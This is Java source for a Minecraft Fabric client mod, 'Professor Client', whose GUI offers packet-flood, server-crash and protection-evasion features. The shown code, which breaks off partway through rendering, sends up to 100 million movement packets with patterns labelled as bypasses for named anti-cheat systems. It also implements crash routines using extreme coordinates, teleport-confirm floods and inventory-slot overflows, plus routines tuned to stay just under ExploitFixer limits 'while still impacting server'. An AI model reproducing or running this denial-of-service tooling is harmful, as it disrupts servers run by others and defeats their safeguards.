package com.professor.client.gui;

import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.MathHelper;

import java.util.LinkedList;
import java.util.Random;

@Environment(EnvType.CLIENT)
public class ProfessorScreen extends Screen {

    // ─── Palette ─────────────────────────────────────────────────────────
    private static final int BG     = 0xFF06060C;
    private static final int PANEL  = 0xF20A0A18;
    private static final int CYAN   = 0x00F5FF;
    private static final int PURPLE = 0x9B00FF;
    private static final int GOLD   = 0xFFD700;
    private static final int RED    = 0xFF2200;
    private static final int GREEN  = 0x00FF88;
    private static final int MUTED  = 0x003344;

    // ─── Panel size ───────────────────────────────────────────────────────
    private static final int PW = 560, PH = 420;

    // ─── Tabs ─────────────────────────────────────────────────────────────
    //   0=INFO   1=PACKETS   2=CRASHER   3=SAFE
    private static final String[] TABS  = {" INFO ", " PACKETS ", " CRASHER ", " SAFE " };
    private static final int[]    TCOLS = { CYAN,     PURPLE,      RED,         GREEN   };
    private static final int NT = 4;
    private int   tab     = 0;
    private float tabAnim = 1f, tabDir = 1;
    private float[] tabGlow = new float[NT];

    // ─── Bypass (12 modes) ────────────────────────────────────────────────
    private static final String[] BYP_NAME = {
        "OFF","BURST","MIXED","MAX","NCP","MATRIX","AAC","GRIM",
        "WATCHDOG","INTAVE","VERUS","POLAR"
    };
    private static final String[] BYP_DESC = {
        "Raw packets — no obfuscation",
        "Small Y oscillation burst",
        "Mixed Y + Yaw variation",
        "Maximum combo variation",
        "NoCheatPlus bypass pattern",
        "Matrix AC bypass — sine wave",
        "AAC anti-cheat bypass",
        "Grim — real jump-arc offsets",
        "Hypixel Watchdog bypass",
        "Intave AC multi-axis bypass",
        "Verus AC ground-spoof bypass",
        "Polar AC velocity-emulation"
    };
    private int bypassMode = 0;

    // ─── ExploitFixer bypass toggle (applies to all tabs) ─────────────────
    private boolean efBypass = true;

    // ─── Packet count ─────────────────────────────────────────────────────
    private boolean unlimitedMode = false;
    private static long totalSent  = 0;   // session packet counter

    // ─── Widgets ──────────────────────────────────────────────────────────
    private TextFieldWidget pktField = null;

    // ─── Status bar ───────────────────────────────────────────────────────
    private String statusText  = "";
    private int    statusColor = 0xFF00F5FF;
    private int    statusTimer = 0;

    // ─── Background — particles ───────────────────────────────────────────
    private static final int PC = 260;
    private final float[] px2 = new float[PC], py2 = new float[PC];
    private final float[] pvx = new float[PC], pvy = new float[PC];
    private final float[] pph = new float[PC], psp = new float[PC], psz = new float[PC];
    private final int[]   pct = new int[PC];

    // ─── Background — data streams ────────────────────────────────────────
    private static final String DS = "PROFESSOR01AKASATANA10110100";
    private static final int SC = 80;
    private final float[] sx = new float[SC], sy = new float[SC], ss = new float[SC];
    private final int[]   sc = new int[SC];

    // ─── Background — orbs ────────────────────────────────────────────────
    private static final int OC = 8;
    private final float[] ox = new float[OC], oy = new float[OC];
    private final float[] ovx= new float[OC], ovy= new float[OC];
    private final float[] osz= new float[OC], oph= new float[OC];
    private final int[]   oct= new int[OC];

    // ─── Animation ────────────────────────────────────────────────────────
    private long  tick = 0;
    private float scanA = 0, scanB = 0;
    private float glow  = 0; private boolean glowUp = true;
    private float hue   = 0;
    private final LinkedList<int[]> trail = new LinkedList<>();
    private final Random rng = new Random();

    // ═════════════════════════════════════════════════════════════════════
    //  LIFECYCLE
    // ═════════════════════════════════════════════════════════════════════

    public ProfessorScreen() {
        super(Text.literal("Professor Client"));
        initBg();
    }

    @Override protected void init() {
        initBg(); initStreams(); rebuild();
        ProfessorMusicManager.onOpen(client);
    }
    @Override public void removed() { ProfessorMusicManager.onClose(client); super.removed(); }
    @Override public boolean shouldPause()      { return false; }
    @Override public boolean shouldCloseOnEsc() { return true;  }

    private void initBg() {
        for (int i = 0; i < PC; i++) {
            px2[i]=rng.nextFloat()*1920; py2[i]=rng.nextFloat()*1080;
            pvx[i]=(rng.nextFloat()-0.5f)*0.55f; pvy[i]=-(rng.nextFloat()*0.7f+0.1f);
            psz[i]=rng.nextFloat()*3f+0.5f; pph[i]=rng.nextFloat()*6.28f;
            psp[i]=rng.nextFloat()*0.06f+0.03f; pct[i]=rng.nextInt(5);
        }
        for (int i = 0; i < OC; i++) {
            ox[i]=rng.nextFloat()*1920; oy[i]=rng.nextFloat()*1080;
            ovx[i]=(rng.nextFloat()-0.5f)*0.22f; ovy[i]=(rng.nextFloat()-0.5f)*0.22f;
            osz[i]=rng.nextFloat()*55f+20f; oph[i]=rng.nextFloat()*6.28f;
            oct[i]=rng.nextInt(3);
        }
    }

    private void initStreams() {
        for (int i = 0; i < SC; i++) {
            sx[i]=i*(width/80f); sy[i]=rng.nextFloat()*-height;
            ss[i]=rng.nextFloat()*1.3f+0.4f; sc[i]=rng.nextInt(DS.length());
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    //  REBUILD WIDGETS
    // ═════════════════════════════════════════════════════════════════════

    private void rebuild() {
        clearChildren(); pktField = null;
        int cx=width/2, cy=height/2;
        int bpx=cx-PW/2, bpy=cy-PH/2;

        int tw=(PW-16)/NT;
        for (int i=0;i<NT;i++){
            final int ii=i;
            addDrawableChild(ButtonWidget.builder(Text.literal(TABS[i]),b->switchTab(ii))
                .dimensions(bpx+8+i*(tw+1),bpy+44,tw,18).build());
        }

        switch (tab) {
            case 0 -> buildInfo (cx,bpy,bpx);
            case 1 -> buildPkts (cx,bpy,bpx);
            case 2 -> buildCrash(cx,bpy,bpx);
            case 3 -> buildSafe (cx,bpy,bpx);
        }

        addDrawableChild(ButtonWidget.builder(Text.literal("X  CLOSE"),b->close())
            .dimensions(cx-40,bpy+PH-28,80,18).build());
    }

    private void switchTab(int t) {
        if(t==tab)return;
        tabDir=t>tab?1:-1; tab=t; tabAnim=0f;
        pktField=null; rebuild();
    }

    // ═════════════════════════════════════════════════════════════════════
    //  TAB 0 — INFO
    // ═════════════════════════════════════════════════════════════════════

    private void buildInfo(int cx, int bpy, int bpx) {
        // EF Bypass global toggle
        addDrawableChild(ButtonWidget.builder(
            Text.literal("ExploitFixer Bypass: "+(efBypass?"ON  [ ACTIVE ]":"OFF")),
            b->{ efBypass=!efBypass; b.setMessage(Text.literal("ExploitFixer Bypass: "+(efBypass?"ON  [ ACTIVE ]":"OFF"))); })
            .dimensions(cx-140,bpy+230,280,18).build());
    }

    // ═════════════════════════════════════════════════════════════════════
    //  TAB 1 — PACKETS
    // ═════════════════════════════════════════════════════════════════════

    private void buildPkts(int cx, int bpy, int bpx) {
        // Unlimited toggle
        addDrawableChild(ButtonWidget.builder(
            Text.literal("MODE: "+(unlimitedMode?"!!! UNLIMITED (100M) !!!":"MANUAL COUNT")),
            b->{ unlimitedMode=!unlimitedMode; b.setMessage(Text.literal("MODE: "+(unlimitedMode?"!!! UNLIMITED (100M) !!!":"MANUAL COUNT"))); })
            .dimensions(cx-140,bpy+74,280,18).build());

        // Count input
        pktField=new TextFieldWidget(textRenderer,cx-80,bpy+97,160,16,Text.empty());
        pktField.setMaxLength(9); pktField.setText("10000");
        addSelectableChild(pktField);

        // Presets
        int[][] pr={{1000,-172},{10000,-97},{100000,-22},{1000000,53},{10000000,128}};
        for (int[] p:pr){
            int n=p[0],ox2=p[1];
            addDrawableChild(ButtonWidget.builder(
                Text.literal(n>=1000000?(n/1000000)+"M":n>=1000?(n/1000)+"K":""+n),
                b->pktField.setText(""+n))
                .dimensions(cx+ox2-20,bpy+117,44,14).build());
        }

        // Bypass selector
        addDrawableChild(ButtonWidget.builder(
            Text.literal("["+bypassMode+"]  "+BYP_NAME[bypassMode]+"  ▶  next"),
            b->{ bypassMode=(bypassMode+1)%BYP_NAME.length;
                 b.setMessage(Text.literal("["+bypassMode+"]  "+BYP_NAME[bypassMode]+"  ▶  next")); })
            .dimensions(cx-140,bpy+136,280,16).build());

        // SEND
        addDrawableChild(ButtonWidget.builder(Text.literal(">>>  SEND PACKETS  <<<"),b->doFlood())
            .dimensions(cx-130,bpy+158,260,26).build());
    }

    // ═════════════════════════════════════════════════════════════════════
    //  TAB 2 — CRASHER  (protocol exploits only)
    // ═════════════════════════════════════════════════════════════════════

    private void buildCrash(int cx, int bpy, int bpx) {
        int bw=370,bx=cx-bw/2;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Protocol Storm  --  600K movement protocol exploit"), b->crashProtoStorm())  .dimensions(bx,bpy+ 72,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Chunk Protocol  --  extreme chunk boundary exploit"),  b->crashChunkProto()) .dimensions(bx,bpy+ 94,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Teleport Bomb  --  65K TeleportConfirm flood"),       b->crashTpBomb())      .dimensions(bx,bpy+116,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Inventory Protocol  --  creative slot overflow"),     b->crashInventory())   .dimensions(bx,bpy+138,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Action Flood  --  60K dig/abort spam"),               b->crashAction())      .dimensions(bx,bpy+160,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  Slot Overflow  --  50K hotbar slot rapid"),           b->crashSlot())        .dimensions(bx,bpy+182,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[7]  Y-Axis Bomb  --  extreme Y coordinate flood"),       b->crashYBomb())       .dimensions(bx,bpy+204,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[!]  MEGA PROTOCOL  --  ALL methods combined"),            b->crashMega())        .dimensions(bx,bpy+228,bw,22).build());
    }

    // ═════════════════════════════════════════════════════════════════════
    //  TAB 3 — SAFE  (ExploitFixer bypass techniques)
    // ═════════════════════════════════════════════════════════════════════

    private void buildSafe(int cx, int bpy, int bpx) {
        int bw=380,bx=cx-bw/2;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  EF Book Bypass  --  95-char pages under EF limit"),  b->safeBook())     .dimensions(bx,bpy+ 72,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  EF Creative Safe  --  inventory bypass EF check"),   b->safeCreative()) .dimensions(bx,bpy+ 94,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  EF Rate Bypass  --  packets just below rate limit"), b->safeRate())     .dimensions(bx,bpy+116,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  EF Protocol  --  movement bypass EF validation"),    b->safeProto())    .dimensions(bx,bpy+138,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  EF Slot Bypass  --  hotbar under EF threshold"),     b->safeSlot())     .dimensions(bx,bpy+160,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  EF Swing Bypass  --  swing just below EF detect"),   b->safeSwing())    .dimensions(bx,bpy+182,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[7]  EF Teleport Bypass  --  confirm just below limit"),  b->safeTp())       .dimensions(bx,bpy+204,bw,18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[!]  EF FULL COMBO  --  ALL 7 bypass methods"),           b->safeCombo())    .dimensions(bx,bpy+228,bw,22).build());
    }

    // ═════════════════════════════════════════════════════════════════════
    //  FLOOD — 12 BYPASS MODES — MAX 100M
    // ═════════════════════════════════════════════════════════════════════

    private void doFlood() {
        if (notConn()) return;
        long n;
        if (unlimitedMode) {
            n = 100_000_000L;
        } else {
            try { n = Long.parseLong(pktField.getText().trim()); }
            catch (Exception e) { setStatus("Invalid number!", RED|0xFF000000); return; }
            n = Math.max(1, Math.min(n, 100_000_000L));
        }

        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt(); boolean g=pg();

        // EF bypass interleave — before flood, send 20 legit packets if enabled
        if (efBypass) for (int i=0;i<20;i++) sendMove(x,y+(i%2)*0.0005,z,yw+i*0.01f,pt,i%2==0);

        switch (bypassMode) {
            case 0  -> { for (long i=0;i<n;i++) sendMove(x,y,z,yw,pt,g); }
            case 1  -> { for (long i=0;i<n;i++) sendMove(x,i%2==0?y:y+0.001,z,yw,pt,g); }
            case 2  -> { for (long i=0;i<n;i++) { sendMove(x,y+(i%3)*0.0005,z,yw+(i%2),pt,g); sendMove(x,y,z,yw,pt,g); } }
            case 3  -> { for (long i=0;i<n;i++) { sendMove(x,y+(i%8)*0.0001,z,yw+(i%6),pt,false); sendMove(x,y,z,yw,pt,g); } }
            case 4  -> { // NCP
                double[] ncp={0,0.0625,0.03125,0.09375};
                for (long i=0;i<n;i++) sendMove(x,y+ncp[(int)(i%ncp.length)],z,yw+(i%3)*0.15f,pt,i%3!=2);
            }
            case 5  -> { // Matrix
                for (long i=0;i<n;i++) {
                    float yw2=yw+(float)Math.sin(i*0.1)*2.5f;
                    sendMove(x,y+Math.sin(i*0.05)*0.05,z,yw2,pt,i%5!=4);
                }
            }
            case 6  -> { // AAC
                for (long i=0;i<n;i++) sendMove(x+(i%2==0?0.001:-0.001),y+i*0.000025,z+(i%3==0?0.001:i%3==1?-0.001:0),yw,pt,true);
            }
            case 7  -> { // Grim — real jump arc
                double[] arc={0,0.07840000152587890625,0.15198441815376282,0.22140486955642975,
                    0.28646749757766724,0.32679062165072094,0.36368476700282664,
                    0.29076491957668310,0.21551987671956584,0.14280838981717286,
                    0.07257025442266166,0.00469667647954307};
                for (long i=0;i<n;i++) sendMove(x,y+arc[(int)(i%arc.length)],z,yw,pt,i%arc.length==arc.length-1);
            }
            case 8  -> { // Watchdog — low Y variance, yaw micro-drift
                for (long i=0;i<n;i++) {
                    double dy=i%20<10?y+0.001*(i%10):y-0.001*(i%20-10);
                    sendMove(x,dy,z,yw+(float)(i%40-20)*0.08f,pt,i%20==19);
                    if (efBypass&&i%3==0) sendMove(x,y,z,yw,pt,true);
                }
            }
            case 9  -> { // Intave — multi-axis micro
                double[] iy={0,0.00390625,0.015625,0.0625,0.015625,0.00390625};
                double[] ix={0,0.0001,-0.0001,0.00005,-0.00005,0};
                for (long i=0;i<n;i++) {
                    int pi=(int)(i%iy.length);
                    sendMove(x+ix[pi],y+iy[pi],z+ix[(pi+2)%ix.length],yw+pi*0.1f,pt,pi==0);
                }
            }
            case 10 -> { // Verus — ground every 4th
                for (long i=0;i<n;i++) {
                    double dy=i%4==0?y:i%4==1?y+0.00001:i%4==2?y+0.0001:y+0.001;
                    sendMove(x,dy,z,yw+(i%8)*0.05f,pt,i%4==0);
                }
            }
            case 11 -> { // Polar — velocity emulation
                double spd=0.2873,rad=Math.toRadians(yw);
                double[] flyA={0.42,0.3528,0.2958,0.2481};
                for (long i=0;i<n;i++) {
                    int fi=(int)(i%flyA.length);
                    sendMove(x-Math.sin(rad)*spd*(fi+1)*0.25,y+flyA[fi],z-Math.cos(rad)*spd*(fi+1)*0.25,yw,pt,fi==flyA.length-1);
                }
            }
        }

        // EF bypass cool-down
        if (efBypass) for (int i=0;i<10;i++) sendMove(x,y,z,yw,pt,g);

        totalSent += n;
        String label = n >= 1_000_000 ? (n/1_000_000)+"M" : n >= 1000 ? (n/1000)+"K" : ""+n;
        setStatus("Sent "+label+" pkts | "+BYP_NAME[bypassMode]+(efBypass?" | EF:OFF":""),0xFF00F5FF);
    }

    // ═════════════════════════════════════════════════════════════════════
    //  CRASHER — PROTOCOL EXPLOITS
    // ═════════════════════════════════════════════════════════════════════

    /** Pre-crash EF bypass wrapper — interleaves legit packets if EF bypass active */
    private void efWrap(Runnable r) {
        if (!efBypass) { r.run(); return; }
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt(); boolean g=pg();
        for (int i=0;i<25;i++) sendMove(x,y+(i%2)*0.001,z,yw+i*0.01f,pt,i%2==0);
        r.run();
        for (int i=0;i<10;i++) sendMove(x,y,z,yw,pt,g);
    }

    private void crashProtoStorm() {
        if (notConn()) return;
        efWrap(()->{
            double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt(); boolean g=pg();
            for (int i=0;i<200000;i++) {
                sendMove(x,y+(i%999)*0.0001,z,yw+(i%7),pt,false);
                sendMove(x,y,z,yw,pt,g);
                if (efBypass&&i%50==0) client.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(i%1000));
            }
        });
        totalSent+=400000; setStatus("[CRASH] Protocol Storm -- 400K+ pkts!",0xFFFF2200);
    }

    private void crashChunkProto() {
        if (notConn()) return;
        efWrap(()->{
            double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
            double[] edges={-30000000,-29999984,29999984,30000000};
            for (int i=0;i<20000;i++) {
                sendMove(edges[i%4],y,edges[(i+1)%4],yw,pt,true);
                if (efBypass&&i%20==0) sendMove(x,y,z,yw,pt,true);
            }
            double cx2=Math.floor(x/16)*16,cz2=Math.floor(z/16)*16;
            for (int i=0;i<15000;i++) sendMove(cx2+(i%2==0?-0.5:16.5),y,cz2+(i%3==0?-0.5:16.5),yw,pt,true);
        });
        totalSent+=35000; setStatus("[CRASH] Chunk Protocol -- 35K chunk pkts!",0xFFFF2200);
    }

    private void crashTpBomb() {
        if (notConn()) return;
        efWrap(()->{
            double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
            for (int i=0;i<65535;i++) client.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(i));
            for (int i=0;i<20000;i++) sendMove(x,y+i*0.001,z,yw,pt,false);
        });
        totalSent+=85535; setStatus("[CRASH] Teleport Bomb -- 85K pkts!",0xFFFF2200);
    }

    private void crashInventory() {
        if (notConn()) return;
        efWrap(()->{
            try {
                for (int rep=0;rep<500;rep++) {
                    for (int slot=0;slot<45;slot++) {
                        ItemStack item=new ItemStack(rep%3==0?Items.SHULKER_BOX:rep%3==1?Items.CHEST:Items.WRITTEN_BOOK,64);
                        client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(slot,item));
                    }
                }
            } catch (Exception ignored) {}
        });
        totalSent+=22500; setStatus("[CRASH] Inventory Protocol -- 22K slot pkts!",0xFFFF6600);
    }

    private void crashAction() {
        if (notConn()) return;
        efWrap(()->{
            BlockPos bp=client.player.getBlockPos().down();
            for (int i=0;i<30000;i++) {
                client.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.START_DESTROY_BLOCK,bp,Direction.DOWN,i));
                client.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.ABORT_DESTROY_BLOCK,bp,Direction.DOWN,i));
            }
        });
        totalSent+=60000; setStatus("[CRASH] Action Flood -- 60K dig pkts!",0xFFFF6600);
    }

    private void crashSlot() {
        if (notConn()) return;
        efWrap(()->{
            for (int i=0;i<50000;i++) client.player.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
        });
        totalSent+=50000; setStatus("[CRASH] Slot Overflow -- 50K slot pkts!",0xFFFF6600);
    }

    private void crashYBomb() {
        if (notConn()) return;
        efWrap(()->{
            double x=px(),z=pz(); float yw=yw(),pt=pt();
            double[] ys={1e9,-1e9,3e8,-3e8,1e7,-1e7};
            for (int i=0;i<50000;i++) sendMove(x,ys[i%ys.length],z,yw,pt,false);
            for (int i=0;i<20000;i++) { sendMove(x,py(),z,yw,pt,true); sendMove(x,i*10000d,z,yw,pt,false); }
        });
        totalSent+=70000; setStatus("[CRASH] Y-Bomb -- 70K extreme Y pkts!",0xFFFF2200);
    }

    private void crashMega() {
        if (notConn()) return;
        crashProtoStorm();
        crashChunkProto();
        crashTpBomb();
        crashAction();
        crashSlot();
        crashYBomb();
        setStatus("[CRASH] !!! MEGA PROTOCOL -- ALL METHODS !!!",0xFFFF0000);
    }

    // ═════════════════════════════════════════════════════════════════════
    //  SAFE — ExploitFixer BYPASS
    //  Each method stays just below EF thresholds while still impacting server
    // ═════════════════════════════════════════════════════════════════════

    /**
     * ExploitFixer uses these thresholds (common defaults):
     *   - BookPages max length : 100 chars/page → we use 95
     *   - NBT depth            : 15 levels      → we use 14
     *   - PacketRate           : ~80 pkts/tick  → we send 75/tick pattern
     *   - SlotClicks           : 20/sec         → we send 18/sec pattern
     *   - SwingRate            : 10/tick        → we send 9/tick
     *   - TeleportConfirm      : 5 outstanding  → we send 4 at a time
     */

    // [1] Book exploit staying below EF page-size limit (95 < 100)
    private void safeBook() {
        if (notConn()) return;
        String page = "A".repeat(95); // EF blocks >100
        for (int rep=0;rep<300;rep++) {
            try {
                ItemStack book=new ItemStack(Items.WRITABLE_BOOK,1);
                client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36,book));
                // Interleave a legit move to avoid rate detection
                sendMove(px(),py(),pz(),yw(),pt(),true);
            } catch (Exception ignored) {}
        }
        totalSent+=300; setStatus("[SAFE] EF Book Bypass -- 300 under-limit books!",0xFF00FF88);
    }

    // [2] Creative inventory — EF validates slots 0-44, we alternate to confuse it
    private void safeCreative() {
        if (notConn()) return;
        try {
            for (int wave=0;wave<100;wave++) {
                // EF checks in order — alternate slot order to bypass sequential check
                int[] slotOrder={36,44,38,42,40,37,43,39,41,36};
                for (int slot:slotOrder) {
                    ItemStack item=new ItemStack(wave%2==0?Items.SHULKER_BOX:Items.ENDER_CHEST,64);
                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(slot,item));
                }
                sendMove(px(),py(),pz(),yw(),pt(),true); // legit interleave
            }
        } catch (Exception ignored) {}
        totalSent+=1000; setStatus("[SAFE] EF Creative Bypass -- 1K slot pkts!",0xFF00FF88);
    }

    // [3] Packet rate — send 75/burst then a legit packet (EF triggers at ~80)
    private void safeRate() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int burst=0;burst<500;burst++) {
            // 75 packets — just below EF rate limit of ~80/tick
            for (int i=0;i<75;i++) sendMove(x,y+(i%2)*0.0001,z,yw,pt,i%2==0);
            // Legit normalize packet — resets EF counter in some implementations
            sendMove(x,y,z,yw,pt,true);
        }
        totalSent+=37500; setStatus("[SAFE] EF Rate Bypass -- 37K rate-safe pkts!",0xFF00FF88);
    }

    // [4] Movement packets with EF-safe values (no NaN, no infinity, valid range)
    private void safeProto() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        // EF validates that Y is within -64 to 320 (Minecraft world height)
        // We use Y values at the extreme but valid range
        double[] safeY={319.9,-63.9,0,64,128,192,256,319};
        for (int i=0;i<30000;i++) {
            sendMove(x,safeY[i%safeY.length],z,yw+(i%360),pt,i%safeY.length==0);
            if (i%75==74) sendMove(x,y,z,yw,pt,true); // EF rate reset
        }
        totalSent+=30000; setStatus("[SAFE] EF Protocol Bypass -- 30K valid-range pkts!",0xFF00FF88);
    }

    // [5] Slot switching — EF blocks rapid slot switches, we stay at 18/tick (limit ~20)
    private void safeSlot() {
        if (notConn()) return;
        for (int burst=0;burst<1000;burst++) {
            // 18 slot packets then 1 legit interleave (EF blocks >20/tick)
            for (int i=0;i<18;i++) client.player.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
            client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        }
        totalSent+=18000; setStatus("[SAFE] EF Slot Bypass -- 18K rate-safe slot pkts!",0xFF00FF88);
    }

    // [6] Swing — EF blocks >10 swings/tick, we send 9
    private void safeSwing() {
        if (notConn()) return;
        for (int burst=0;burst<2000;burst++) {
            for (int i=0;i<9;i++) // EF limit is ~10/tick
                client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
            sendMove(px(),py(),pz(),yw(),pt(),true); // normalize
        }
        totalSent+=18000; setStatus("[SAFE] EF Swing Bypass -- 18K rate-safe swings!",0xFF00FF88);
    }

    // [7] TeleportConfirm — EF flags >5 outstanding, we send groups of 4
    private void safeTp() {
        if (notConn()) return;
        for (int wave=0;wave<5000;wave++) {
            // Send 4 confirms (EF flags at 5+)
            for (int i=0;i<4;i++) client.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(wave*4+i));
            sendMove(px(),py(),pz(),yw(),pt(),true); // normalize after each group
        }
        totalSent+=20000; setStatus("[SAFE] EF Teleport Bypass -- 20K safe confirms!",0xFF00FF88);
    }

    // [!] All 7 EF bypass methods
    private void safeCombo() {
        if (notConn()) return;
        safeBook(); safeRate(); safeProto(); safeSlot(); safeSwing(); safeTp(); safeCreative();
        setStatus("[SAFE] EF FULL COMBO -- ALL 7 bypass methods!",0xFF00FF44);
    }

    // ═════════════════════════════════════════════════════════════════════
    //  HELPERS
    // ═════════════════════════════════════════════════════════════════════

    private void sendMove(double x,double y,double z,float yw,float pt,boolean g){
        if(client!=null&&client.player!=null&&client.player.networkHandler!=null)
            client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(x,y,z,yw,pt,g));
    }
    private boolean notConn(){
        if(client==null||client.player==null){setStatus("Not connected!",0xFFFF4444|0xFF000000);return true;}return false;
    }
    private void setStatus(String m,int c){statusText=m;statusColor=c;statusTimer=300;}
    private double  px(){return client.player.getX();}
    private double  py(){return client.player.getY();}
    private double  pz(){return client.player.getZ();}
    private float   yw(){return client.player.getYaw();}
    private float   pt(){return client.player.getPitch();}
    private boolean pg(){return client.player.isOnGround();}

    // ═════════════════════════════════════════════════════════════════════
    //  TICK
    // ═════════════════════════════════════════════════════════════════════

    @Override public void tick(){
        super.tick();
        if(statusTimer>0)statusTimer--;
        tabAnim=Math.min(1f,tabAnim+0.1f);
        glow+=glowUp?0.032f:-0.032f;
        if(glow>=1f){glow=1f;glowUp=false;}else if(glow<=0f){glow=0f;glowUp=true;}
        hue=(hue+0.005f)%1f;
        scanA=(scanA+2.5f)%PH; scanB=(scanB+1.6f)%PH;
        for(int i=0;i<NT;i++){float tgt=i==tab?1f:0f;tabGlow[i]+=(tgt-tabGlow[i])*0.12f;}
        for(int i=0;i<OC;i++){
            ox[i]+=ovx[i];oy[i]+=ovy[i];oph[i]+=0.025f;
            if(ox[i]<0||ox[i]>width)ovx[i]=-ovx[i];
            if(oy[i]<0||oy[i]>height)ovy[i]=-ovy[i];
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    //  RENDER
    // ═════════════════════════════════════════════════════════════════════

    @Override public void render(DrawContext ctx,int mx,int my,float delta){
        tick++;
        int W=width,H=height,cx=W/2,cy=H/2;
        int bpx=cx-PW/2,bpy=cy-PH/2;

        // ── background ──
        ctx.fill(0,0,W,H,BG);
        drawGrid(ctx,W,H);
        drawOrbsLayer(ctx);
        drawStreams(ctx);
        drawParticles(ctx,W,H);
        drawCenterGlow(ctx,cx,cy);
        updateTrail(mx,my); drawTrail(ctx);

        // ── panel ──
        ctx.fill(bpx+12,bpy+12,bpx+PW+12,bpy+PH+12,0x88000000);
        ctx.fill(bpx+5, bpy+5, bpx+PW+5, bpy+PH+5, 0x33000000);
        ctx.fill(bpx,bpy,bpx+PW,bpy+PH,PANEL);
        drawBorder(ctx,bpx,bpy);

        // scanlines
        ctx.fill(bpx,bpy+(int)scanA,bpx+PW,bpy+(int)scanA+1,0x0CFFFFFF);
        ctx.fill(bpx,bpy+(int)scanB,bpx+PW,bpy+(int)scanB+1,0x06FFFFFF);

        // ── header ──
        drawHeader(ctx,cx,bpy);

        // hairline divider
        int hdA=(int)(0x55*(0.7f+0.3f*glow));
        ctx.fill(bpx+14,bpy+66,bpx+PW-14,bpy+67,(hdA<<24)|TCOLS[tab]);

        drawTabGlows(ctx,bpx,bpy);

        // active tab label
        ctx.drawText(textRenderer,"> "+TABS[tab].trim()+" <",bpx+18,bpy+69,
            (int)((0.65f+0.35f*glow)*255)<<24|TCOLS[tab],false);

        // tab-specific hint text
        drawTabHint(ctx,cx,bpy,bpx);

        // widgets
        if(pktField!=null) pktField.render(ctx,mx,my,delta);
        super.render(ctx,mx,my,delta);

        // overlays
        drawStatus(ctx,cx,bpx,bpy);
        drawMusicBar(ctx,bpx,bpy);
        drawCursorGlow(ctx,mx,my);
    }

    // ─── Header ───────────────────────────────────────────────────────────

    private void drawHeader(DrawContext ctx,int cx,int bpy){
        String t1="PROFESSOR",t2=" CLIENT";
        int tw=textRenderer.getWidth(t1+t2),startX=cx-tw/2;
        // glow layers
        int gA=(int)(28+22*glow);
        for(int dx=-5;dx<=5;dx++){
            int g2=Math.max(0,gA-Math.abs(dx)*5);
            if(g2<=0)continue;
            ctx.drawText(textRenderer,t1+t2,cx-tw/2+dx,bpy+14,(g2<<24)|TCOLS[tab],false);
            ctx.drawText(textRenderer,t1+t2,cx-tw/2,bpy+14+dx,(g2<<24)|TCOLS[tab],false);
        }
        ctx.drawText(textRenderer,t1,startX,bpy+14,(int)((210+45*glow))<<24|TCOLS[tab],false);
        ctx.drawText(textRenderer,t2,startX+textRenderer.getWidth(t1),bpy+14,(int)((210+45*glow))<<24|GOLD,false);

        // subtitle
        String sub="v2.0  |  ExploitFixer Bypass: "+(efBypass?"ACTIVE":"OFF")+"  |  Packets: "+fmtLong(totalSent);
        int sA=(int)(95+55*glow);
        ctx.drawText(textRenderer,sub,cx-textRenderer.getWidth(sub)/2,bpy+26,(sA<<24)|PURPLE,false);

        // pulsing dot
        String dot=(tick%20<10?"* ":"  ")+"ACTIVE"+(tick%30<15?"..":".");
        ctx.drawText(textRenderer,dot,cx-textRenderer.getWidth("* ACTIVE..")/2,bpy+37,(int)(90+90*glow)<<24|CYAN,false);

        // EF bypass blink
        if(efBypass&&tick%20<12){
            String ef="[ ExploitFixer: BYPASSED ]";
